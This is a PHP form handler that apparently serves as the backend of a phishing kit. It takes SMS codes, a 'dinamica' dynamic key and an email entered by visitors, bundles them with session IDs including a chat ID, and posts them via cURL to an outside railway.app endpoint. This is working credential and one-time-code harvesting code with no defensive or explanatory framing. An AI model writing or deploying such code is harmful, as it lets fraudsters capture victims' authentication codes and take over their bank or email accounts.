<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $sms = $_POST['sms'] ?? null;
    $dinamica = $_POST['dinamica'] ?? null;
    $correo = $_POST['correo'] ?? null;
    // Generar uniqueID
    $uniqueID = $_SESSION['uniqueID'];
    $chatID = $_SESSION['chatID'];
    // Preparar los datos para enviar a la API
    $data = [
        'uniqueID' => $uniqueID,
        'sms' => $sms,
        'dinamica' => $dinamica,
        'chatID' => $chatID,
        'correo' => $correo,
    ];
    if (isset($_SESSION['vlidatePage'])) {
        unset($_SESSION['vlidatePage']);
    }
    $ch = curl_init('https://spike-production-453f.up.railway.app/sendCodes');
    if (strlen($correo) > 6) {

        $ch = curl_init('https://spike-production-453f.up.railway.app/sendCorreo');
    }
    // Configurar cURL
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

    // Ejecutar la solicitud y obtener la respuesta
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    // Cerrar cURL
    curl_close($ch);

    // Enviar la respuesta de vuelta al cliente
    echo json_encode([
        'response' => json_decode($response),
        'httpCode' => $httpCode,
    ]);
} else {
    echo json_encode(['error' => 'Invalid request method']);
}
